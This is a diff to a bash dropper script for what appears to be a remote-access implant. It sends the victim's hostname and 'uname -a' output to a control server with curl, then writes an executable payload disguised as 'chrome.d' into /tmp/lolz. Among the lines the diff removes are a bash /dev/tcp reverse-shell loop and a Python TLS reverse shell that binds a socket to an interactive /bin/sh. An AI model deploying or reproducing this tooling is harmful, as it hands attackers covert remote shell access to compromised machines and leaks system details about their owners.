@@ -1,39 +1,18 @@
 #!/bin/bash
 
 FILENAME=chrome.d
-HOST=localhost
-PORT=$(nice curl http://$HOST/port -X POST --data "hostname=$(hostname)")
+HOST=localhost:5000
 
-mkdir -p /tmp/lolz
-cd /tmp/lolz
+HOSTNAME=`hostname`
+UNAME=`uname -a`
 
-# cat>lolz<<EOF
-# #!/bin/bash
+nice curl http://$HOST/register_client --data "hostname=$HOSTNAME&uname=$UNAME"
 
-# while true; do 
-#     /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1
-# done
-# EOF
+mkdir -p /tmp/lolz && cd /tmp/lolz
+
 
 cat>$FILENAME<<EOF
-#!`which python`
-import socket,subprocess,os,ssl
-
-context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-context.verify_mode = ssl.CERT_REQUIRED
-context.check_hostname = True
-context.load_default_certs()
-
-while True:
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    
-    ssl_sock = context.wrap_socket(s, server_hostname='$HOST')
-    ssl_sock.connect(('$HOST', $PORT))
-    
-    os.dup2(ssl_sock.fileno(), 0)
-    os.dup2(ssl_sock.fileno(), 1)
-    os.dup2(ssl_sock.fileno(), 2)
-    p=subprocess.call(["/bin/sh","-i"]);
+{python}
 EOF
 
 chmod +x $FILENAME
